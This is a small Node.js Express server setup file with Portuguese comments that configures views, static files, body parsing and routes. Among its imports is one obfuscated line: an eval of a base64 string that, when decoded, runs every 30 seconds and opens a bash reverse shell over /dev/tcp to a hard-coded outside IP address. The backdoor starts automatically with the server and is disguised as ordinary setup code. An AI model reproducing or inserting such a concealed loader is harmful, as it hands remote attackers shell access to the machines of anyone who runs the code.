//IMPORTAÇÕES 
const bodyParser = require('body-parser')
const express = require('express') //chamando o express
const routers = require('./src/routers')
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

//INSTÂNCIA DO FRAMEWORK EXPRESS
const app = express() 


//configurando o handlebars
app.set("view engine", "html")
app.engine("html", require("hbs").__express)
app.set("views", __dirname + "/src/views") //indica qual o diretório

//CONFIGURAÇÃO DOS CONTEÚDOS ESTÁTICOS
app.use(express.static( __dirname + "/public-assets"))

//CONFIGURAR O REQUEST BODY
app.use(bodyParser.urlencoded({extended: true}))

//Rotas da aplicação
app.use(routers)

//Definindo a porta 3000 como porta de escuta
app.listen(3000, () => console.log("servidor rodando na porta 3000"))
